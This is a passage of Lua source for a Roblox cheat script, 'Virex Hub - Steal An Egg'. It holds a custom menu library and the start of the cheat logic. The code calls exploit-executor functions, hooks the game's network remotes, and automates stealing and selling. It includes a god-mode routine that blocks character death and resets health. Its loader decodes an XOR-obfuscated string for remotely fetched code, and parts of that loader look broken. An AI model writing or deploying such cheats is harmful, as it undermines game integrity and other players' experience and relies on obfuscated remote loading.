			if not allowDec then v = math.floor(v + 0.5) end
			return math.clamp(math.floor(v * 1e6 + 0.5) / 1e6, minV, maxV)
		end
		local function fmt(v)
			if type(o.ValueFormat) == "function" then
				local ok, r = pcall(o.ValueFormat, v)
				if ok and r ~= nil then return tostring(r) end
			end
			local s = (allowDec and inc < 1) and string.gsub(string.gsub(string.format("%.2f", v), "0+$", ""), "%.$", "") or tostring(math.floor(v + 0.5))
			if unit ~= "" then s = string.match(unit, "^%a") and (s .. " " .. unit) or (s .. unit) end
			return s
		end
		h._value = snap(o.Default)
		local native
		local pg = place(self, o)
		if pg then
			native = build(pg, self, function()
				return Slider(pg, tostring(o.Name or ""), minV, maxV, h._value, "", function(v)
					v = snap(v)
					if v ~= h._value then h._value = v h:_fire(v) end
				end, snap, fmt)
			end)
			h._row = lastCard(pg)
			if h._row then outline(h._row) end
		end
		function h:Set(v, silent)
			v = snap(v)
			local changed = v ~= self._value
			self._value = v
			if native then native.show(v) end
			if changed and not silent then self:_fire(v) end
		end
		queueInit(h, function() h:_fire(h._value) end)
		refreshAll(h._win)
		return h
	end

	-- selector flotante (dropdown y multi)
	local picker
	local function openPicker(titleText, options, isOn, onPick, multi, onAll)
		if picker then picker.close() end
		local back = new("TextButton", { Parent = content, Size = UDim2.fromScale(1, 1), BackgroundColor3 = BLACK, BackgroundTransparency = 1, AutoButtonColor = false, Text = "", ZIndex = 40 })
		local rows = #options + (multi and 1 or 0)
		local hh = math.min(math.max(rows, 1) * 40 + 58, content.AbsoluteSize.Y / math.max(rootScale.Scale, 0.01) - 24)
		local panel = new("CanvasGroup", { Parent = back, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Size = UDim2.fromOffset(310, hh), BackgroundColor3 = Theme.Panel, GroupTransparency = 1, ZIndex = 41 }, { corner(22) })
		liquidGlass(panel, 0.25)
		local psc = new("UIScale", { Parent = panel, Scale = 0.8 })
		fontProp(new("TextLabel", { Parent = panel, BackgroundTransparency = 1, Position = UDim2.fromOffset(18, 12), Size = UDim2.new(1, -36, 0, 22), Font = FONT_HEAD, TextSize = 14, TextColor3 = Theme.Accent2, TextXAlignment = Enum.TextXAlignment.Left, TextTruncate = Enum.TextTruncate.AtEnd, Text = string.upper(titleText), ZIndex = 42 }))
		local list = new("ScrollingFrame", { Parent = panel, Position = UDim2.fromOffset(12, 44), Size = UDim2.new(1, -24, 1, -54), BackgroundTransparency = 1, BorderSizePixel = 0, ScrollBarThickness = 3, ScrollBarImageColor3 = Theme.Accent2, CanvasSize = UDim2.new(), AutomaticCanvasSize = Enum.AutomaticSize.Y, ZIndex = 42 },
			{ new("UIListLayout", { Padding = UDim.new(0, 6), SortOrder = Enum.SortOrder.LayoutOrder }) })
		local closed = false
		local function close()
			if closed then return end
			closed = true
			if picker and picker.back == back then picker = nil end
			tween(psc, 0.25, { Scale = 0.85 }, BACK, IN)
			tween(panel, 0.25, { GroupTransparency = 1 })
			tween(back, 0.25, { BackgroundTransparency = 1 })
			task.delay(0.27, function() back:Destroy() end)
		end
		picker = { back = back, close = close }
		local btns = {}
		local function paintAll()
			for opt, b in pairs(btns) do
				local on = isOn(opt)
				tween(b, 0.2, { BackgroundColor3 = on and WHITE or Theme.Card2, TextColor3 = on and Theme.Dark or Theme.Text })
			end
		end
		if multi then
			local top = new("Frame", { Parent = list, LayoutOrder = 0, Size = UDim2.new(1, 0, 0, 34), BackgroundTransparency = 1, ZIndex = 43 })
			for k, label in ipairs({ "All", "None" }) do
				local b = new("TextButton", { Parent = top, Position = UDim2.new((k - 1) * 0.5, (k - 1) * 3, 0, 0), Size = UDim2.new(0.5, -3, 1, 0), BackgroundColor3 = Theme.Accent, AutoButtonColor = false, Font = Enum.Font.GothamBlack, TextSize = 12, TextColor3 = Theme.Dark, Text = label, ZIndex = 43 }, { corner(12) })
				local bs = new("UIScale", { Parent = b })
				bind(b.Activated, function()
					pressBounce(bs, 0.9)
					sfx("Toggle", k == 1 and 1.3 or 0.8, 0.5)
					onAll(k == 1)
					paintAll()
				end)
			end
		end
		for i, opt in ipairs(options) do
			local b = new("TextButton", { Parent = list, LayoutOrder = i, Size = UDim2.new(1, 0, 0, 34), BackgroundColor3 = Theme.Card2, AutoButtonColor = false, Font = Enum.Font.GothamBold, TextSize = 13, TextColor3 = Theme.Text, Text = tostring(opt), TextTruncate = Enum.TextTruncate.AtEnd, ZIndex = 43 }, { corner(12) })
			btns[opt] = b
			local bs = new("UIScale", { Parent = b })
			bind(b.Activated, function()
				pressBounce(bs, 0.9)
				onPick(opt)
				sfx("Toggle", isOn(opt) and 1.3 or 0.8, 0.5)
				paintAll()
				if not multi then task.delay(0.12, close) end
			end)
		end
		paintAll()
		bind(back.Activated, function() sfx("Click", 0.9, 0.5) close() end)
		sfx("Open", 1.8, 0.3)
		tween(back, 0.3, { BackgroundTransparency = 0.45 })
		tween(panel, 0.3, { GroupTransparency = 0 })
		tween(psc, 0.5, { Scale = 1 }, BACK)
	end
	local function selectorCard(pg, titleText, onTap)
		local c, sc = card(pg)
		cardText(c, titleText, nil, 150)
		local pill = new("TextLabel", { Parent = c, AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, -14, 0.5, 0), Size = UDim2.fromOffset(124, 32), BackgroundColor3 = BLACK, Font = Enum.Font.GothamBold, TextSize = 12, TextColor3 = Theme.Accent2, TextTruncate = Enum.TextTruncate.AtEnd, Text = "", ZIndex = 14 }, { corner(), pad(0, 26, 0, 12) })
		themeProp(pill, "TextColor3", "Accent2")
		liquidGlass(pill, 0.55)
		new("TextLabel", { Parent = pill, BackgroundTransparency = 1, AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(1, 4, 0.5, 0), Size = UDim2.fromOffset(16, 16), Font = Enum.Font.GothamBlack, TextSize = 10, TextColor3 = Theme.Text, Text = "▼", ZIndex = 15 })
		local psc = new("UIScale", { Parent = pill })
		bind(c.Activated, function()
			pressBounce(sc, 0.96)
			pressBounce(psc, 0.85)
			onTap()
		end)
		outline(c)
		return c, pill
	end

	function SectionT:CreateDropdown(o)
		o = o or {}
		local h = newHandle(self, o, "dropdown")
		h._options = {}
		for _, v in ipairs(o.Options or {}) do table.insert(h._options, v) end
		local function find(v)
			for _, x in ipairs(h._options) do if x == v or tostring(x) == tostring(v) then return x end end
			return nil
		end
		h._value = find(o.Default)
		if h._value == nil then h._value = h._options[1] end
		local pill
		local function paint() if pill then pill.Text = h._value ~= nil and tostring(h._value) or "None" end end
		local pg = place(self, o)
		if pg then
			h._row, pill = build(pg, self, function()
				return selectorCard(pg, tostring(o.Name or ""), function()
					openPicker(tostring(o.Name or ""), h._options, function(x) return x == h._value end, function(x) h:Set(x) end, false)
				end)
			end)
		end
		paint()
		function h:Set(v, silent)
			local f = find(v)
			if f == nil then return end
			local changed = f ~= self._value
			self._value = f
			paint()
			if changed and not silent then self:_fire(f) end
		end
		function h:SetOptions(opts, selected, fire)
			self._options = {}
			for _, v in ipairs(opts or {}) do table.insert(self._options, v) end
			local keep = find(selected)
			if keep == nil then keep = find(self._value) end
			if keep == nil then keep = self._options[1] end
			self._value = keep
			paint()
			if fire == true then self:_fire(self._value) end
		end
		queueInit(h, function() h:_fire(h._value) end)
		refreshAll(h._win)
		return h
	end

	function SectionT:CreateMultiDropdown(o)
		o = o or {}
		local h = newHandle(self, o, "multi")
		h._options, h._sel = {}, {}
		for _, v in ipairs(o.Options or {}) do table.insert(h._options, v) end
		local function applySelection(v)
			h._sel = {}
			if type(v) == "table" then
				for k, x in pairs(v) do
					local name = (type(k) == "string" and x == true) and k or ((type(x) == "string") and x or nil)
					if name ~= nil then h._sel[name] = true end
				end
			end
		end
		local function toArray()
			local out = {}
			for _, opt in ipairs(h._options) do if h._sel[tostring(opt)] then table.insert(out, opt) end end
			return out
		end
		local function payload()
			local t = {}
			for i, n in ipairs(toArray()) do t[i] = n t[tostring(n)] = true end
			return t
		end
		local pill
		local function paint()
			h._value = toArray()
			if not pill then return end
			local arr = h._value
			if #arr == 0 then pill.Text = "None"
			elseif #arr == #h._options then pill.Text = "All"
			elseif #arr <= 2 then
				local names = {}
				for _, n in ipairs(arr) do table.insert(names, tostring(n)) end
				pill.Text = table.concat(names, ", ")
			else pill.Text = #arr .. " selected" end
		end
		local pg = place(self, o)
		if pg then
			h._row, pill = build(pg, self, function()
				return selectorCard(pg, tostring(o.Name or ""), function()
					openPicker(tostring(o.Name or ""), h._options, function(x) return h._sel[tostring(x)] == true end, function(x)
						local n = tostring(x)
						h._sel[n] = (not h._sel[n]) or nil
						paint()
						h:_fire(payload())
					end, true, function(all)
						h._sel = {}
						if all then for _, x in ipairs(h._options) do h._sel[tostring(x)] = true end end
						paint()
						h:_fire(payload())
					end)
				end)
			end)
		end
		applySelection(o.Default)
		paint()
		function h:Get() return toArray() end
		function h:Set(v, silent)
			applySelection(v)
			paint()
			if not silent then self:_fire(payload()) end
		end
		function h:SetOptions(opts, selected, fire)
			self._options = {}
			for _, x in ipairs(opts or {}) do table.insert(self._options, x) end
			local valid = {}
			for _, x in ipairs(self._options) do valid[tostring(x)] = true end
			if selected ~= nil then applySelection(selected) end
			for k in pairs(self._sel) do if not valid[k] then self._sel[k] = nil end end
			paint()
			if fire == true then self:_fire(payload()) end
		end
		queueInit(h, function() h:_fire(payload()) end)
		refreshAll(h._win)
		return h
	end

	-- TEXTO / LABEL / BOTON / INPUT
	local function textItem(sec, o, kind)
		local h = newHandle(sec, o, kind)
		h._value = o.Text
		local body
		local pg = place(sec, o)
		if pg then
			h._row = build(pg, sec, function()
				local c = card(pg)
				fontProp(new("TextLabel", { Parent = c, BackgroundTransparency = 1, Position = UDim2.fromOffset(16, 12), Size = UDim2.new(1, -32, 0, 16), Font = FONT_HEAD, TextSize = 12, TextColor3 = Theme.Accent2, TextXAlignment = Enum.TextXAlignment.Left, TextTruncate = Enum.TextTruncate.AtEnd, Text = string.upper(tostring(o.Name or "")), ZIndex = 13 }))
				body = new("TextLabel", { Parent = c, BackgroundTransparency = 1, Position = UDim2.fromOffset(16, 30), Size = UDim2.new(1, -32, 1, -36), Font = Enum.Font.GothamMedium, TextSize = 12, TextColor3 = Theme.Text, TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top, TextWrapped = true, TextTruncate = Enum.TextTruncate.AtEnd, RichText = true, Text = tostring(o.Text or ""), ZIndex = 13 })
				outline(c)
				return c
			end)
		end
		function h:Set(v)
			if type(v) == "table" then v = v.Text end
			self._value = v
			if body then body.Text = tostring(v or "") end
		end
		refreshAll(h._win)
		return h
	end
	function SectionT:CreateText(o) return textItem(self, o or {}, "text") end
	function SectionT:CreateLabel(o) return textItem(self, o or {}, "label") end
	function SectionT:CreateButton(o)
		o = o or {}
		local h = newHandle(self, o, "button")
		local pg = place(self, o)
		if pg then
			build(pg, self, function() Button(pg, tostring(o.Name or ""), o.Note, tostring(o.ButtonText or "Run"), function() safeCall(o.Callback) end) end)
			h._row = lastCard(pg)
			if h._row then outline(h._row) end
		end
		refreshAll(h._win)
		return h
	end
	function SectionT:CreateInput(o)
		o = o or {}
		local h = newHandle(self, o, "input")
		h._value = tostring(o.Default or "")
		function h:Set(v, silent)
			self._value = tostring(v or "")
			if not silent then self:_fire(self._value) end
		end
		return h
	end

	-- PESTANAS / VENTANA
	local TabT = {}
	TabT.__index = TabT
	function TabT:CreateSection(o)
		o = o or {}
		return setmetatable({ _win = self._win, _route = ROUTES[tostring(o.Name)], _name = o.Name }, SectionT)
	end
	local WindowT = {}
	WindowT.__index = WindowT
	function WindowT:GetDefaultTab() return self._default end
	function WindowT:CreateTab(o)
		return setmetatable({ _win = self, Name = tostring((o or {}).Name or "Tab") }, TabT)
	end
	function WindowT:SelectTab() end
	function WindowT:CreateState(o)
		o = o or {}
		local s = { _value = o.Default }
		function s:Get() return self._value end
		function s:Set(v) self._value = v end
		function s:GetValue() return self._value end
		function s:SetValue(v) self._value = v end
		return s
	end
	function WindowT:CreateExclusiveGroup(o)
		o = o or {}
		return { Name = o.Name, MaxActive = tonumber(o.MaxActive) or 1, Members = {} }
	end
	function WindowT:SetOpen(v) if v then open() else close() end end
	function WindowT:Toggle() toggleMenu() end
	function WindowT:Destroy() task.spawn(destroyAll) end

	function Lib.Notify(title, text, duration)
		notify(tostring(title or "VIREX"), tostring(text or ""), tonumber(duration) or 4)
	end

	function Lib:CreateWindow(o)
		o = o or {}
		local win = setmetatable({ _items = {}, _initQueue = {}, _ready = false }, WindowT)
		local introDone, opened = false, false
		win._tryOpen = function()
			if opened or not introDone or not win._ready then return end
			opened = true
			open()
			task.delay(1.4, function()
				notify("Welcome, " .. player.DisplayName, isMobile and "Tap the VIREX button to open and close" or ("Press " .. CONFIG.ToggleKey.Name .. " to open and close"), 4)
			end)
		end
		playIntro(function()
			introDone = true
			win._tryOpen()
			task.delay(10, function() if not opened then opened = true open() end end)
		end)
		win._default = win:CreateTab({ Name = o.DefaultTab or "Main" })
		return win
	end

	function Lib:Finalize(o)
		local win = (o or {}).Window
		if type(win) ~= "table" then return end
		win._ready = true
		refreshAll(win)
		win._tryOpen()
		task.spawn(function()
			local queue = win._initQueue
			win._initQueue = {}
			for i, fn in ipairs(queue) do
				safeCall(fn)
				if i % 20 == 0 then task.wait() end
			end
			refreshAll(win)
		end)
	end
end

return Lib
end)()
local fn, v, v2, defaultTab, Players, RunService, ReplicatedStorage, CoreGui, UserInputService, localPlayer
local networking, fn2, tbl, v3, fn3, fn4, tbl2, fn5, fn6, tbl3
local tbl4, fn7, tbl5, v4, v5, espSection, tbl6, n, tbl7, tbl8
local tbl9, tbl10, v6, sequence, tbl11
do
local CollectionService, ProximityPromptService, v7, v8, tbl12, tbl13, tbl14, n2, n3, n4
local tbl15, str, tbl16, tbl17, tbl18, tbl19, tbl20, tbl21
do
fn = function(arg)
local genv = typeof(getgenv) == "function" and getgenv() or _G
if type(genv.ChilliDebugPrint) == "function" then
pcall(genv.ChilliDebugPrint, arg)
end
end
local function fn8()
local response = nil
local function fn9()
if type(response) == "string" and #response > 0 then
return response
end
response = game:HttpGet("about:blank")
return response
end
local function fn10()
local chilliHubSaeCleanup = (typeof(getgenv) == "function" and getgenv() or _G).ChilliHubSaeCleanup
if type(chilliHubSaeCleanup) == "function" then
pcall(chilliHubSaeCleanup)
end
local tbl22 = { game:GetService("CoreGui") }
if typeof(gethui) == "function" then
local ok, result = pcall(gethui)
if ok and typeof(result) == "Instance" then
table.insert(tbl22, result)
end
end
local tbl23 = {
Settings = true,
ChilliLeftCenter = true,
ChilliLibrarySettings = true,
ChilliLibraryLauncher = true,
}
local n5 = 0
for _, v9 in ipairs(tbl22) do
for _, child in ipairs(v9:GetChildren()) do
local isScreenGui = child:IsA("ScreenGui")
local flag
if isScreenGui then
flag = child:GetAttribute("ChilliLibraryOwned") == true or tbl23[child.Name]
else
flag = isScreenGui
end
if flag then
pcall(function()
child:Destroy()
end)
n5 += 1
end
end
end
if n5 > 0 then
fn("cleared " .. n5 .. " leftover Chilli UI screens")
end
end
local function fn11()
local v9 = fn9()
local chunk, v10 = loadstring(v9)
assert(chunk, v10)
local v11 = chunk()
assert(type(v11) == "function", "Chilli Library bootstrap is invalid.")
local v12 = table.create(45)
local n5 = 1
for i = 1, 90, 2 do
v12[n5] = string.char(bit32.bxor(tonumber(string.sub("306908100841206d474f00185f26635b2101387507010810127d7d477a473b6f435a0916573165562900226c00", i, i + 1), 16), string.byte("s9K!2vQ#", (n5 - 1) % 8 + 1)))
n5 += 1
end
return v11(table.concat(v12))
end
local chilliLibraryFailedToLoad = "unknown"
for i = 1, 6 do
task.wait()
pcall(fn10)
local ok, result = pcall(fn11)
if ok and type(result) == "table" then
return result
end
chilliLibraryFailedToLoad = tostring(result)
if type(chilliLibraryFailedToLoad) == "string" and string.find(chilliLibraryFailedToLoad, "HttpGet", 1, true) then
response = nil
end
fn("library load attempt " .. i .. " failed: " .. chilliLibraryFailedToLoad)
task.wait(1 + i * 0.5)
end
error("Chilli Library failed to load: " .. chilliLibraryFailedToLoad, 0)
end
v = VirexLib
assert(type(v) == "table" and type(v.CreateWindow) == "function" and type(v.Finalize) == "function", "Chilli Library returned an invalid API.")
v.ManualQuickDefaults = {
PinnedFeatures = { "Player > Movement > Speed Boost", "Player > Movement > Boost Speed" },
Keybinds = { ["Player > Movement > Speed Boost"] = "Q" },
PinGroups = {},
LeftCenterHidden = true,
}
v2 = v:CreateWindow({ Name = "Virex Hub - Steal An Egg", DefaultTab = "Main" })
defaultTab = v2:GetDefaultTab()
Players = game:GetService("Players")
RunService = game:GetService("RunService")
ReplicatedStorage = game:GetService("ReplicatedStorage")
CoreGui = game:GetService("CoreGui")
UserInputService = game:GetService("UserInputService")
CollectionService = game:GetService("CollectionService")
game:GetService("LocalizationService")
ProximityPromptService = game:GetService("ProximityPromptService")
localPlayer = Players.LocalPlayer
networking = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Networking")
fn2 = function(arg)
local ok, result = pcall(function()
return require(arg())
end)
return ok and result or nil
end
tbl = {
EggState = fn2(function()
return ReplicatedStorage.Client.EggState
end),
AreaEggs = fn2(function()
return ReplicatedStorage.Shared.Types.AreaEggs
end),
ToolGameplayGuard = fn2(function()
return ReplicatedStorage.Client.ToolGameplayGuard
end),
Assets = fn2(function()
return ReplicatedStorage.Data.Assets
end),
Guards = fn2(function()
return ReplicatedStorage.Data.Guards
end),
EggRecords = fn2(function()
return ReplicatedStorage.Shared.Util.EggRecords
end),
Mutations = fn2(function()
return ReplicatedStorage.Shared.Modules.Mutations
end),
Save = fn2(function()
return ReplicatedStorage.Shared.Save
end),
FuseKernel = fn2(function()
return ReplicatedStorage.Shared.Util.FuseKernel
end),
AreaEggCycle = fn2(function()
return ReplicatedStorage.Shared.Util.AreaEggCycle
end),
AreaEggResetWall = fn2(function()
return ReplicatedStorage.Client.AreaEggResetWall
end),
AreaEggResetCycle = fn2(function()
return ReplicatedStorage.Data.AreaEggResetCycle
end),
Gears = fn2(function()
return ReplicatedStorage.Data.Gears
end),
Areas = fn2(function()
return ReplicatedStorage.Data.Areas
end),
LimitedEgg = fn2(function()
return ReplicatedStorage.Data.LimitedEgg
end),
BrainrotEgg = fn2(function()
return ReplicatedStorage.Data.BrainrotEgg
end),
MonsterEgg = fn2(function()
return ReplicatedStorage.Data.MonsterEgg
end),
}
local save = tbl.Save
if type(save) == "table" and (type(save.Get) ~= "function" or type(save.FieldSignal) ~= "function") then
tbl.Save = setmetatable({
Get = type(save.Get) == "function" and save.Get or save.Peek,
FieldSignal = type(save.FieldSignal) == "function" and save.FieldSignal or save.Watch,
}, { __index = save })
end
local function fn9()
if typeof(gethui) == "function" then
local ok, result = pcall(gethui)
if ok and typeof(result) == "Instance" then
return result
end
end
return CoreGui
end
v3 = fn9()
do
local v9 = Random.new()
local str2 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
fn3 = function()
local v10 = v9:NextInteger(12, 20)
local v11 = table.create(v10)
for i = 1, v10 do
local v12 = v9:NextInteger(1, #str2)
v11[i] = string.sub("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", v12, v12)
end
return table.concat(v11)
end
end
do
local tbl22 = {}
fn4 = function(arg)
table.insert(tbl22, arg)
end
tbl2 = {}
fn5 = function(arg, arg2)
local n5 = 1000
local n6 = 3
local n7 = 12
local function fn10(arg3)
if arg3 <= 0 then
return 0
end
local n8 = 10 ^ (math.floor(math.log10(arg3)) - 2)
return math.floor(arg3 / n8 + 0.5) * n8
end
local function fn11(arg3)
local n8 = math.clamp(tonumber(arg3) or 0, 0, 1000)
if n8 <= 0 then
return 0
end
return fn10(10 ^ (n6 + (n7 - n6) * n8 / n5))
end
local function fn12(arg3)
local n8 = tonumber(arg3) or 0
if n8 <= 0 then
return 0
end
return math.clamp(math.floor((math.log10(n8) - n6) / (n7 - n6) * n5 * 100 + 0.5) / 100, 0, 1000)
end
local function fn13(arg3)
local format = string.format
local str2 = arg3 >= 100 and "%.0f"
if not str2 then
str2 = arg3 >= 10 and "%.1f" or "%.2f"
end
local v9 = format(str2, arg3)
if string.find(v9, ".", 1, true) then
v9 = string.gsub(string.gsub(v9, "0+$", ""), "%.$", "")
end
return v9
end
local function fn14(arg3)
local v9 = fn11(arg3)
if v9 <= 0 then
return "Off"
end
if v9 < 1000000 then
return fn13(v9 / 1000) .. " K/s"
end
if v9 < 1e9 then
return fn13(v9 / 1000000) .. " M/s"
end
return fn13(v9 / 1e9) .. " B/s"
end
local function fn15(arg3)
local v9 = fn11(arg3)
if v9 <= 0 then
return "0"
end
if v9 < 1000000 then
return fn13(v9 / 1000) .. "k"
end
return (string.gsub(string.gsub(string.format("%.3f", v9 / 1000000), "0+$", ""), "%.$", ""))
end
local tbl23 = { k = 1000, m = 1000000, b = 1e9, t = 1e12 }
local function fn16(arg3)
local v9 = string.gsub(string.lower(string.gsub(tostring(arg3 or ""), "[%s,/]", "")), "s$", "")
if v9 == "" or v9 == "off" then
return 0
end
local v10, v11 = string.match(v9, "^([%d%.]+)([kmbt]?)$")
local num = tonumber(v10)
if not num then
return nil
end
return fn12(num * (tbl23[v11] or 1000000))
end
local v9 = arg:CreateSlider({
Name = arg2.Name,
Note = arg2.Note,
SubOf = arg2.SubOf,
Min = 0,
Max = n5,
Default = fn12(arg2.Default or 0),
AllowDecimals = true,
Increment = 0.01,
ValueFormat = fn14,
ValueParse = fn16,
Callback = function(arg3)
if type(arg2.OnRaw) == "function" then
arg2.OnRaw(fn11(arg3))
end
end,
})
local value = type(v9) == "table" and rawget(v9, "Instance") or nil
if typeof(value) == "Instance" then
for _, descendant in ipairs(value:GetDescendants()) do
if descendant:IsA("TextBox") then
local connection = descendant.Focused:Connect(function()
task.defer(function()
if descendant:IsFocused() then
local ok, result = pcall(v9.Get, v9)
descendant.Text = fn15(ok and result or 0)
descendant.CursorPosition = #descendant.Text + 1
descendant.SelectionStart = 1
end
end)
end)
fn4(function()
pcall(function()
connection:Disconnect()
end)
end)
end
end
end
if type(arg2.Legacy) == "string" and type(arg2.SectionName) == "string" then
table.insert(tbl2, { Handle = v9, Name = arg2.Name, Legacy = arg2.Legacy, Section = arg2.SectionName, StepOf = fn12 })
end
return v9
end
local text = "All"
fn6 = function(arg)
if type(arg) ~= "table" then
return arg
end
local value = rawget(arg, "Instance")
if typeof(value) ~= "Instance" then
return arg
end
local flag = false
local function fn10(arg2)
if flag then
return
end
if arg2.Text == "None" then
flag = true
arg2.Text = text
flag = false
end
end
local function fn11(descendant)
if not descendant:IsA("TextLabel") or descendant.Name ~= "Value" then
return
end
fn10(descendant)
local connection = descendant:GetPropertyChangedSignal("Text"):Connect(function()
fn10(descendant)
end)
fn4(function()
pcall(function()
connection:Disconnect()
end)
end)
end
for _, descendant in ipairs(value:GetDescendants()) do
fn11(descendant)
end
local connection = value.DescendantAdded:Connect(fn11)
fn4(function()
pcall(function()
connection:Disconnect()
end)
end)
return arg
end
local genv = typeof(getgenv) == "function" and getgenv() or _G
local chilliHubSaeCleanup = genv.ChilliHubSaeCleanup
if type(chilliHubSaeCleanup) == "function" then
pcall(chilliHubSaeCleanup)
end
genv.ChilliHubSaeCleanup = function()
for i = #tbl22, 1, -1 do
pcall(tbl22[i])
end
table.clear(tbl22)
end
end
do
local n5 = 0
local fn10 = nil
fn10 = function(arg, arg2)
local n6 = arg2 or 0
if type(arg) == "table" then
if n6 > 3 then
return
end
local n7 = 0
for k, v9 in pairs(arg) do
n7 += 1
if not (n7 > 20) then
fn10(k, n6 + 1)
fn10(v9, n6 + 1)
continue
end
break
end
elseif typeof(arg) == "Instance" then
pcall(arg.GetFullName, arg)
else
n5 += #tostring(arg)
end
end
local tbl22 = {}
local function fn11(arg)
tbl22[#tbl22 + 1] = arg
end
local function fn12()
for _, v9 in ipairs(tbl22) do
pcall(function()
v9:Disconnect()
end)
end
table.clear(tbl22)
end
local function chilliToolKeeper()
fn12()
for _, v9 in ipairs({
"RE/GearSatchel/Lost",
"RE/GearSatchel/Gained",
"RE/RigSync/ProbeSatchel",
"RE/RigSync/SeedSatchel",
"RE/RigSync/CorrectionBegan",
"RE/RigSync/Refresh",
"RE/ToolTrigger/Trigger",
"RE/BatSwing/Trigger",
}) do
local v10 = networking:FindFirstChild(v9)
if v10 and v10:IsA("RemoteEvent") then
fn11(v10.OnClientEvent:Connect(function(...)
fn10({ ... })
end))
end
end
local function fn13(arg)
if not arg then
return
end
fn11(arg.ChildRemoved:Connect(function(child)
if child:IsA("Tool") then
fn10({ child.Name, child.Parent })
end
end))
fn11(arg.ChildAdded:Connect(function(child)
if child:IsA("Tool") then
fn10({ child.Name })
end
end))
end
fn13(localPlayer:FindFirstChildOfClass("Backpack"))
fn11(localPlayer.ChildAdded:Connect(function(child)
if child:IsA("Backpack") then
fn13(child)
end
end))
task.spawn(function()
pcall(function()
local v9 = tbl.Save.Get()
fn10({ v9.GearInventory, v9.Inventory }, 2)
end)
if type(getgc) == "function" then
pcall(function()
for _, v9 in ipairs(getgc(false)) do
if type(v9) == "function" and islclosure(v9) then
pcall(debug.info, v9, "n")
end
end
end)
end
end)
end
;(typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper = chilliToolKeeper
task.defer(chilliToolKeeper)
fn4(fn12)
end
do
local n5 = 0.35
local n6 = 5
local tbl22 = {}
local flag = true
tbl3 = {
Add = function(arg)
local tbl23 = { Run = arg, Gap = n5, Idle = n6, Repeat = false, Hold = 0 }
table.insert(tbl22, tbl23)
return tbl23
end,
Wake = function()
flag = true
end,
Backoff = function(arg, arg2)
if arg then
arg.Hold = tonumber(arg2) or 6
end
end,
}
local connection = RunService.Heartbeat:Connect(function(deltaTime)
local v9 = flag
flag = false
for _, v10 in ipairs(tbl22) do
v10.Gap = v10.Gap + deltaTime
v10.Idle = v10.Idle + deltaTime
if v10.Hold > 0 then
v10.Hold = v10.Hold - deltaTime
elseif v10.Gap >= n5 and (v9 or v10.Repeat or v10.Idle >= n6) then
v10.Gap = 0
v10.Idle = 0
local ok, result = pcall(v10.Run, v10)
v10.Repeat = ok and result == true
end
end
end)
fn4(function()
connection:Disconnect()
end)
end
v7 = defaultTab:CreateSection({ Name = "Dr Scramble Lab & Mech", Expanded = false })
local v9
v9 = defaultTab:CreateSection({ Name = "Auto Steal", Expanded = true })
local v10
v10 = defaultTab:CreateSection({ Name = "Auto Place Egg", Expanded = false }) -- hidden later
local v11
v11 = defaultTab:CreateSection({ Name = "Auto Treadmill", Expanded = false })
local v12
v12 = defaultTab:CreateSection({ Name = "Auto Hatch & Equip", Expanded = false })
local v13
v13 = defaultTab:CreateSection({ Name = "Auto Sell", Expanded = false }) -- hidden later
tbl.SellLabSection = defaultTab:CreateSection({ Name = "Auto Sell Lab Egg", Expanded = false }) -- hidden later
local v14
v14 = defaultTab:CreateSection({ Name = "Auto Fuse Machine", Expanded = false })
v8 = defaultTab:CreateSection({ Name = "Auto Favorite", Expanded = false })
tbl12 = { Paused = false }
do
local n5 = 0.5
local v15 = nil
local tbl22 = nil
local tbl23 = {}
local flag = false
local n6 = 0
local function fn10()
for i = #tbl23, 1, -1 do
local v16 = tbl23[i]
if v16 and v16.Connected then
v16:Disconnect()
end
tbl23[i] = nil
end
end
local function fn11()
fn10()
local v16 = v15
local v17 = tbl22
v15 = nil
tbl22 = nil
if not v16 or not v16.Parent or not v17 then
return
end
pcall(function()
v16.BreakJointsOnDeath = v17.BreakJointsOnDeath
v16.RequiresNeck = v17.RequiresNeck
v16:SetStateEnabled(Enum.HumanoidStateType.Dead, v17.DeadEnabled)
end)
end
local function fn12(arg)
if not arg or not arg.Parent then
return false
end
return pcall(function()
arg.BreakJointsOnDeath = false
arg.RequiresNeck = false
arg:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
end) and arg.BreakJointsOnDeath == false and arg.RequiresNeck == false and arg:GetStateEnabled(Enum.HumanoidStateType.Dead) == false
end
local function fn13(arg)
if tbl12.Paused or arg ~= v15 or not arg or not arg.Parent or flag then
return false
end
local maxHealth = arg.MaxHealth
if maxHealth <= 0 then
return false
end
if maxHealth == math.huge or arg.Health >= maxHealth then
return true
end
flag = true
local ok = pcall(function()
arg.Health = maxHealth
end)
flag = false
return ok and arg.Health >= maxHealth
end
local function fn14(arg)
if arg == v15 and arg and arg.Parent then
return true
end
fn11()
if not arg or not arg:IsA("Humanoid") or not arg.Parent then
return false
end
v15 = arg
tbl22 = {
BreakJointsOnDeath = arg.BreakJointsOnDeath,
RequiresNeck = arg.RequiresNeck,
DeadEnabled = arg:GetStateEnabled(Enum.HumanoidStateType.Dead),
}
if not fn12(arg) then
fn11()
return false
end
fn13(arg)
tbl23[#tbl23 + 1] = arg.HealthChanged:Connect(function()
fn13(arg)
end)
tbl23[#tbl23 + 1] = arg:GetPropertyChangedSignal("MaxHealth"):Connect(function()
fn13(arg)
end)
tbl23[#tbl23 + 1] = arg.StateChanged:Connect(function(old, new)
if new == Enum.HumanoidStateType.Dead and not tbl12.Paused then
fn12(arg)
fn13(arg)
end
end)
n6 = os.clock()
return true
end
local function fn15()
local character = localPlayer.Character
return character and character:FindFirstChildOfClass("Humanoid") or nil
end
local connection = localPlayer.CharacterAdded:Connect(function()
task.defer(function()
fn14(fn15())
end)
end)
local connection2 = RunService.Heartbeat:Connect(function()
local now = os.clock()
if tbl12.Paused or now - n6 < n5 then
return
end
n6 = now
local v16 = fn15()
if v16 ~= v15 then
fn14(v16)
return
end
if v16 then
fn12(v16)
fn13(v16)
end
end)
task.defer(function()
fn14(fn15())
end)
fn4(function()
if connection then
connection:Disconnect()
end
if connection2 then
connection2:Disconnect()
end
